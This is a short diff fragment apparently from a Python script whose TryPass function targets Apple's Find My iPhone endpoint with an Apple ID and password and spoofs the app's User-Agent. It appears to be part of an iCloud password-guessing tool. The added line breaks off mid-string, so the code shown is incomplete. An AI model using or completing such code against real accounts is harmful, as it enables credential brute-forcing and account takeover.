@@ -35,8 +35,7 @@ import socket
 
 def TryPass(apple_id,password):
 
-
-	url = 'https://fmipmobile.icloud.com/fmipservice/device/'+apple_id+'/initClient'
+	url = 'https://fmipmobile.icloud.com/f
 
 	headers = {
 		'User-Agent': 'FindMyiPhone/376 CFNetwork/672.0.8 Darwin/14.0.0',
